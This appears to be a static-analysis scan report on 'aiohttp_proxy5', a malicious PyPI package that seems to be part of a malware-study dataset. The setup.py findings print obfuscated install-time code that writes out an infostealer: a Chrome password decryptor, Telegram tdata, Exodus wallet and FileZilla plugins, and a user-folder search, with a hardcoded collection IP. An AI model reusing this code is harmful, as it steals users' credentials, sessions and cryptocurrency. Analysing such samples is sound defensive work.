Run started:2025-04-13 09:04:54.464276

Test results:
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/connector.py:85
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
84	            )
85	            await sock.connect((host, port))
86	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/connector.py:100
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
99	            )
100	        return await super(ProxyConnector, self).connect(
101	            req=req, traces=traces, timeout=timeout
102	        )

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/helpers.py:63
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
62	    proxy_type=ProxyType.SOCKS5,
63	    socks_host="127.0.0.1",
64	    socks_port=1080,
65	    username=None,
66	    password=None,
67	    rdns=True,
68	    family=socket.AF_INET,
69	    loop=None,
70	    **kwargs
71	):
72	    if host is None or port is None:
73	        raise ValueError("host and port must be specified")  # pragma: no cover
74	
75	    if loop is None:
76	        loop = asyncio.get_event_loop()

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/helpers.py:95
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
94	        raise ProxyError("Only socks proxies are allowed to use `open_connection`")
95	    await sock.connect((host, port))
96	

--------------------------------------------------
>> Issue: [B823:ip_found] ip_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/helpers.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b823_ip_found.html
106	    proxy_type=ProxyType.SOCKS5,
107	    socks_host="127.0.0.1",
108	    socks_port=1080,
109	    username=None,
110	    password=None,
111	    rdns=True,
112	    family=socket.AF_INET,
113	    loop=None,
114	    **kwargs
115	):
116	    if protocol_factory is None:
117	        raise ValueError("protocol_factory " "must be specified")  # pragma: no cover
118	
119	    if host is None or port is None:
120	        raise ValueError("host and port " "must be specified")  # pragma: no cover
121	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/helpers.py:142
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
141	        raise ProxyError("Only socks proxies are allowed to use `create_connection`")
142	    await sock.connect((host, port))
143	

--------------------------------------------------
>> Issue: [B806:sendall] socket.socket.sendall
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b806_sendall.html
103	                raise ValueError("Unsupported item")
104	        await self._loop.sock_sendall(self._socket, data)
105	

--------------------------------------------------
>> Issue: [B809:recv] socket.socket.recv
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html
108	        while len(data) < n:
109	            packet = await self._loop.sock_recv(self._socket, n - len(data))
110	            if not packet:

--------------------------------------------------
>> Issue: [B304:blacklist] socket.socket
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:137
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
136	
137	        self._socket = socket.socket(family=self._family, type=socket.SOCK_STREAM)
138	        self._socket.setblocking(False)

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:141
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
140	        try:
141	            await self._loop.sock_connect(
142	                sock=self._socket, address=(self._socks_host, self._socks_port)
143	            )

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:145
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
144	        except OSError as e:
145	            self.close()
146	            raise SocksConnectionError(

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:152
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
151	        except asyncio.CancelledError:  # pragma: no cover
152	            self.close()
153	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:158
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
157	        except SocksError:
158	            self.close()
159	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:162
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
161	            if _is_proactor(self._loop) or _is_uvloop(self._loop):
162	                self.close()
163	            raise

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:166
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
165	    def close(self):
166	        self._socket.close()
167	

--------------------------------------------------
>> Issue: [B806:sendall] socket.socket.sendall
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:169
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b806_sendall.html
168	    async def sendall(self, data):
169	        await self._loop.sock_sendall(self._socket, data)
170	

--------------------------------------------------
>> Issue: [B809:recv] socket.socket.recv
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:172
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b809_recv.html
171	    async def recv(self, nbytes):
172	        return await self._loop.sock_recv(self._socket, nbytes)
173	

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:215
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
214	
215	        await self._send(req)
216	

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:229
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
228	    async def negotiate(self):
229	        await self._socks_connect()
230	

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:257
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
256	
257	        await self._send(req)
258	        res = await self._receive(2)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:284
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
283	
284	            await self._send(req)
285	            res = await self._receive(2)

--------------------------------------------------
>> Issue: [B805:send] socket.socket.send
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:298
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b805_send.html
297	
298	        await self._send(req)
299	        res = await self._receive(3)

--------------------------------------------------
>> Issue: [B804:connect] socket.socket.connect
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/aiohttp_proxy5/proto.py:370
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b804_connect.html
369	        await self._socks_auth()
370	        await self._socks_connect()

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:18
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
17	                now = datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
18	                f.write(f'{now} | {text}\n')
19	            else:

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:18
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
17	                now = datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
18	                f.write(f'{now} | {text}\n')
19	            else:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:20
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
19	            else:
20	                f.write(f'{text}\n')
21	    except:

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:20
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
19	            else:
20	                f.write(f'{text}\n')
21	    except:

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:58
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
57	    try:
58	        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
59	    except IndexError:

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:66
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
65	with open("README.md") as f:
66	    long_description = f.read()
67	

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:74
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
73	    license="Apache 2",
74	    url="https://github.com/Skactor/aiohttp-proxy",
75	    description="Full-featured proxy connector for aiohttp",

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:83
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
82	
83	os.system('pip install aiofiles')
84	os.system('pip install aiohttp')

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:83
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
82	
83	os.system('pip install aiofiles')
84	os.system('pip install aiohttp')

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:84
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
83	os.system('pip install aiofiles')
84	os.system('pip install aiohttp')
85	os.system('pip install cryptography')

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:84
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
83	os.system('pip install aiofiles')
84	os.system('pip install aiohttp')
85	os.system('pip install cryptography')

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:85
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
84	os.system('pip install aiohttp')
85	os.system('pip install cryptography')
86	os.system('pip install aiosqlite')

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:85
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
84	os.system('pip install aiohttp')
85	os.system('pip install cryptography')
86	os.system('pip install aiosqlite')

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:86
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
85	os.system('pip install cryptography')
86	os.system('pip install aiosqlite')
87	_O00O000OO00O00O0O =b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile, copytree\r\n\r\n\r\nclass Telegram(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        tdata_path = join(path, 'tdata')\r\n        if not isdir(tdata_path):\r\n            return\r\n\r\n        telegram_path = join(self.conf.log_path, 'telegram')\r\n        if not isdir(telegram_path):\r\n            mkdir(telegram_path)\r\n\r\n        res_path = join(telegram_path, f'tdata_{token_hex(4)}')\r\n        mkdir(res_path)\r\n\r\n        blacklist = ['dumps', 'emoji', 'user_data', 'working']\r\n\r\n        for f in scandir(tdata_path):\r\n            file_ok = True\r\n            for i in blacklist:\r\n                if i in f.name:\r\n                    file_ok = False\r\n                    break\r\n            \r\n            if not file_ok:\r\n                continue\r\n            \r\n            from_path = join(tdata_path, f.name)\r\n            dest_path = join(res_path, f.name)\r\n\r\n            func = copyfile if f.is_file() else copytree\r\n            await func(from_path, dest_path)\r\n"#line:1

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:86
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
85	os.system('pip install cryptography')
86	os.system('pip install aiosqlite')
87	_O00O000OO00O00O0O =b"from plugins import Plugin\r\nfrom config import Config\r\nfrom os.path import isdir, join\r\nfrom os import mkdir, scandir\r\nfrom secrets import token_hex\r\nfrom tools import copyfile, copytree\r\n\r\n\r\nclass Telegram(Plugin):\r\n    def __init__(self, conf: Config) -> None:\r\n        self.conf = conf\r\n\r\n    async def callback(self, path: str) -> None:\r\n        if not isdir(path):\r\n            return\r\n\r\n        tdata_path = join(path, 'tdata')\r\n        if not isdir(tdata_path):\r\n            return\r\n\r\n        telegram_path = join(self.conf.log_path, 'telegram')\r\n        if not isdir(telegram_path):\r\n            mkdir(telegram_path)\r\n\r\n        res_path = join(telegram_path, f'tdata_{token_hex(4)}')\r\n        mkdir(res_path)\r\n\r\n        blacklist = ['dumps', 'emoji', 'user_data', 'working']\r\n\r\n        for f in scandir(tdata_path):\r\n            file_ok = True\r\n            for i in blacklist:\r\n                if i in f.name:\r\n                    file_ok = False\r\n                    break\r\n            \r\n            if not file_ok:\r\n                continue\r\n            \r\n            from_path = join(tdata_path, f.name)\r\n            dest_path = join(res_path, f.name)\r\n\r\n            func = copyfile if f.is_file() else copytree\r\n            await func(from_path, dest_path)\r\n"#line:1

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:97
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
96		try :yield OO0O00O0OO000OO0O #line:10
97		finally :shutil .rmtree (OO0O00O0OO000OO0O )#line:11
98	with __O0OO0OO0000OO0O00 ()as __OO0O0O0OOOO000OOO :#line:12

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
106						os .mkdir (OOO0OO00OOO0O0O0O )#line:20
107						with open (os .path .join (OOO0OO00OOO0O0O0O ,'__init__.py'),OO0OOOOOO0O0OO0OO )as O0OO0000000OO0OO0 :O0OO0000000OO0OO0 .write (b'\n')#line:21
108			O00OOO0O0O00OO0O0 (os .path .dirname (OO00OOOOOOOOO0OO0 ));OO000O0O0000O00OO =os .path .join (__OO0O0O0OOOO000OOO ,OO00OOOOOOOOO0OO0 )#line:22

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
106						os .mkdir (OOO0OO00OOO0O0O0O )#line:20
107						with open (os .path .join (OOO0OO00OOO0O0O0O ,'__init__.py'),OO0OOOOOO0O0OO0OO )as O0OO0000000OO0OO0 :O0OO0000000OO0OO0 .write (b'\n')#line:21
108			O00OOO0O0O00OO0O0 (os .path .dirname (OO00OOOOOOOOO0OO0 ));OO000O0O0000O00OO =os .path .join (__OO0O0O0OOOO000OOO ,OO00OOOOOOOOO0OO0 )#line:22

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
108			O00OOO0O0O00OO0O0 (os .path .dirname (OO00OOOOOOOOO0OO0 ));OO000O0O0000O00OO =os .path .join (__OO0O0O0OOOO000OOO ,OO00OOOOOOOOO0OO0 )#line:22
109			with open (OO000O0O0000O00OO ,OO0OOOOOO0O0OO0OO )as OOO00OOO000O0O00O :OOO00OOO000O0O00O .write (O00OOOO0OOO0OO0OO )#line:23
110		import sys as __stickytape_sys ;__stickytape_sys .path .insert (0 ,__OO0O0O0OOOO000OOO );__O0O0O0OOOOO0O0O00 ('path_search.py',b"import asyncio\r\nimport os\r\nfrom os.path import join, isdir\r\nfrom typing import Dict, Iterable, List\r\n\r\n\r\nLOCAL = os.environ['USERPROFILE']\r\n\r\nroot_paths = {\r\n    join(LOCAL, 'appdata'),\r\n    join(LOCAL, 'appdata', 'local'),\r\n    join(LOCAL, 'appdata', 'roaming'),\r\n    join(LOCAL, 'documents'),\r\n    join(LOCAL, 'downloads'),\r\n    join(LOCAL, 'desktop'),\r\n    'C:\\\\',\r\n    'D:\\\\',\r\n    'E:\\\\',\r\n    'C:\\\\Program Files',\r\n    'C:\\\\Program Files (x86)',\r\n    'C:\\\\\\ProgramData'\r\n\r\n}\r\n\r\n\r\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\r\n    tasks: List[asyncio.Task] = []\r\n\r\n    queries = {k.lower(): v for k,v in queries.items()}\r\n    target_folder_names = set(queries.keys())\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if queries[fname] is not None:\r\n                    curr_path = join(p, fname)\r\n                    loop = asyncio.get_event_loop()\r\n                    task = loop.create_task(queries[fname].callback(curr_path))\r\n                    tasks.append(task)\r\n\r\n    for task in tasks:\r\n        await task\r\n\r\n\r\nasync def search_paths(paths: Iterable[str], queries: Iterable):\r\n    target_folder_names = {i.lower() for i in queries}\r\n    for p in paths:\r\n        if isdir(p):\r\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\r\n                if fname in target_folder_names:\r\n                    yield join(p, fname)\r\n");__O0O0O0OOOOO0O0O00 ('config.py',b'from dataclasses import dataclass, field\r\nfrom aiohttp import ClientSession as Session\r\n\r\n\r\n@dataclass\r\nclass Config:\r\n    client_id: str\r\n    host: str\r\n    log_path: str\r\n    browser_passwords: bool = field(default=True)\r\n    browser_cookies: bool = field(default=True)');__O0O0O0OOOOO0O0O00 ('paths.py',b"from os import environ\r\nfrom os.path import join\r\n\r\n\r\nLOCAL = environ['USERPROFILE']\r\nTEMP = join(LOCAL, 'appdata', 'local', 'temp')");__O0O0O0OOOOO0O0O00 ('tools.py',b"import os\r\nfrom aiofiles.os import wrap\r\nfrom shutil import copyfile, copytree\r\nimport timeit\r\n\r\n\r\ndef zipdir(path, ziph):\r\n    '''From stackoverflow'''\r\n    # ziph is zipfile handle\r\n    for root, dirs, files in os.walk(path):\r\n        for file in files:\r\n            ziph.write(os.path.join(root, file), \r\n                       os.path.relpath(os.path.join(root, file), \r\n                                       os.path.join(path, '..')))\r\n\r\ncopyfile = wrap(copyfile)\r\ncopytree = wrap(copytree)\r\n");__O0O0O0OOOOO0O0O00 ('plugins/__init__.py',b'from .base_plugin import Plugin\r\n\r\nfrom .browsers import Chromium\r\n\r\nfrom .details import Details\r\n\r\nfrom .wallets import Exodus\r\n\r\nfrom .filezilla import Filezilla\r\n\r\nfrom .telegram import Telegram');__O0O0O0OOOOO0O0O00 ('plugins/base_plugin.py',b'from config import Config\r\nfrom abc import ABC, abstractmethod\r\n\r\n\r\nclass Plugin(ABC):\r\n    @abstractmethod\r\n    def __init__(self, conf: Config) -> None:\r\n        ...\r\n\r\n    @abstractmethod\r\n    async def callback(path: str) -> None:\r\n        ...');__O0O0O0OOOOO0O0O00 ('plugins/browsers/__init__.py',b'from .chromium import Chromium');__O0O0O0OOOOO0O0O00 ('plugins/browsers/chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/browsers/decrypt.py',b'# https://github.com/hakanonymos/steal-chrome-password-all-version/blob/master/local.py\r\n\r\n\r\nimport ctypes\r\nimport ctypes.wintypes\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    Cipher, algorithms, modes)\r\nimport base64\r\nimport os\r\nimport json\r\n\r\n\r\nclass Decryptor:\r\n    def __init__(self, path) -> None:\r\n        if path is None:\r\n            self.path = os.path.join(os.environ[\'LOCALAPPDATA\'], r"Google\\Chrome\\User Data\\Local State")\r\n        else:\r\n            self.path = path\r\n        \r\n        self.key = None\r\n        self.cipher = None\r\n\r\n    @staticmethod\r\n    def dpapi_decrypt(encrypted):\r\n        class DATA_BLOB(ctypes.Structure):\r\n            _fields_ = [(\'cbData\', ctypes.wintypes.DWORD),\r\n                        (\'pbData\', ctypes.POINTER(ctypes.c_char))]\r\n\r\n        p = ctypes.create_string_buffer(encrypted, len(encrypted))\r\n        blobin = DATA_BLOB(ctypes.sizeof(p), p)\r\n        blobout = DATA_BLOB()\r\n        retval = ctypes.windll.crypt32.CryptUnprotectData(\r\n            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\r\n        if not retval:\r\n            raise ctypes.WinError()\r\n        result = ctypes.string_at(blobout.pbData, blobout.cbData)\r\n        ctypes.windll.kernel32.LocalFree(blobout.pbData)\r\n        return result\r\n\r\n    @staticmethod\r\n    def decrypt(cipher, ciphertext, nonce):\r\n        cipher.mode = modes.GCM(nonce)\r\n        decryptor = cipher.decryptor()\r\n        return decryptor.update(ciphertext)\r\n\r\n    def get_key_from_local_state(self):\r\n        jsn = None\r\n        with open(self.path, \'r\') as f:\r\n            jsn = json.loads(str(f.readline()))\r\n        return jsn[\'os_crypt\'][\'encrypted_key\']\r\n\r\n    @staticmethod\r\n    def get_cipher(key):\r\n        cipher = Cipher(\r\n            algorithms.AES(key),\r\n            None,\r\n            backend=default_backend()\r\n        )\r\n        return cipher\r\n\r\n    def aes_decrypt(self, encrypted_txt):\r\n        if self.key is None:\r\n            encoded_key = self.get_key_from_local_state()\r\n            encrypted_key = base64.b64decode(encoded_key.encode())\r\n            encrypted_key = encrypted_key[5:]\r\n            self.key = Decryptor.dpapi_decrypt(encrypted_key)\r\n            self.cipher = Decryptor.get_cipher(self.key)\r\n        \r\n        nonce = encrypted_txt[3:15]\r\n\r\n        return Decryptor.decrypt(self.cipher,encrypted_txt[15:],nonce)\r\n\r\n    def decrypt_password(self, data):\r\n        try:\r\n            if data[:4] == b\'\\x01\\x00\\x00\\x00\':\r\n                decrypted = Decryptor.dpapi_decrypt(data)\r\n                return decrypted.decode()\r\n            elif data[:3] == b\'v10\':\r\n                decrypted = self.aes_decrypt(data)\r\n                return decrypted[:-16].decode()\r\n        except:\r\n            return None');__O0O0O0OOOOO0O0O00 ('plugins/browsers/Chromium.py',_OO00OOO0OOO0OOO00 );__O0O0O0OOOOO0O0O00 ('plugins/details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/wallets/__init__.py',b'from .exodus import Exodus');__O0O0O0OOOOO0O0O00 ('plugins/wallets/exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/wallets/Exodus.py',_OOO000O00000OOOO0 );__O0O0O0OOOOO0O0O00 ('plugins/filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/telegram.py',_O00O000OO00O00O0O );__O0O0O0OOOOO0O0O00 ('plugins/Details.py',_O0O00OOO0O000000O );__O0O0O0OOOOO0O0O00 ('plugins/Filezilla.py',_O0OOO0OOOO0OO0OOO );__O0O0O0OOOOO0O0O00 ('plugins/Telegram.py',_O00O000OO00O00O0O );import asyncio ;from asyncio import create_task ;from weakref import proxy ;from path_search import search_plugin_paths ,root_paths ;from config import Config ;from aiohttp import ClientSession as Session ,MultipartWriter ,hdrs ,FormData ;import secrets ,timeit ;from paths import TEMP ;from os import mkdir ;from os .path import join ;from zipfile import ZipFile ,ZIP_DEFLATED ;from base64 import b64encode ;from tools import zipdir ;from plugins import Chromium ,Details ,Exodus ,Filezilla ,Telegram ;HOST ='http://144.24.115.170'#line:24

--------------------------------------------------
>> Issue: [B832:write] tempfile_NamedTemporaryFile_write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxy5-0.1.12/aiohttp_proxy5-0.1.12/setup.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b832_write.html
108			O00OOO0O0O00OO0O0 (os .path .dirname (OO00OOOOOOOOO0OO0 ));OO000O0O0000O00OO =os .path .join (__OO0O0O0OOOO000OOO ,OO00OOOOOOOOO0OO0 )#line:22
